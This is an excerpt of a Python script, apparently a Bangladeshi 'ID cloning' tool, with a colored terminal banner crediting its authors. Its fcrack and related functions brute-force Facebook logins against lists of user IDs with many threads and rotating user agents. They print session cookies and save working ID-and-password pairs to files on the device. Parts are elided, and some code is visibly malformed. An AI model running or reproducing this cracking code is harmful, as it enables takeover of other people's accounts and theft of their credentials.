...
\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mRDJ I'd Cloning Tools\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mBayzid & RIDOY          \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/Tony-Stark01     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+8801941366999                     \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mVersion  : \x1b[97;1m1.0  	                      \x1b[97;1m║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╝""")
def linex():
	print('  \033[0m╠═══════════════════════════════════════════════════')
loop = 0
...
def fia():    
			print(logo)
			print('  \x1b[97;1m║ [×]VERSION : \033[38;5;45m 1.0 ')
			...
			if xd in ['4','04']:
				...
				os.system(f'xdg-open https://www.facebook.com/ridoysharkarofficial.5/');menu()
			elif xd in ['3','03']:
				os.system(f'xdg-open https://github.com/Tony-Stark01/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r  \x1b[97;1m║ [RDJ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r  \x1b[97;1m║ [RDJ-OK] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/RDJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r  \x1b[97;1m║ [RDJ-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/RDJ-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				open('/sdcard/RDJ-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
...
def random_number1():
	...
	print('  \x1b[97;1m║ \033[38;5;46m[?] Ids saved in RDJ-ok.txt,RDJ-cp.txt')
	print(47*"—") 
...
def bd():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			...
			yaari.submit(fcrack,uid,pwx,tl)
	print('  \x1b[97;1m║ \033[38;5;46m [✓] Crack process has been completed')
	print('  \x1b[97;1m║ \033[38;5;46m [?] Ids saved inRDJ-ok.txt,RDJ-cp.txt')
	input('   Press Inter To Back Menu')
	fia()
#_____
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r  \x1b[97;1m║ [\033[1;97mRDJ]\033[0m %s|\033[38;5;46mOK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('  \x1b[97;1m║ \033[38;5;46m[RDJ-OK][🔥]  ' +uid+ ' | ' +ps+' '+Jawnx(uid)+' ')
				print(f" Cookie : {coki}")
                cek_apk(session,coki)
				open('/sdcard/RDJ-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('  \x1b[97;1m║ \033[38;5;196m[RDJ-CP][😭] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
				open('/sdcard/RDJ-CP.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
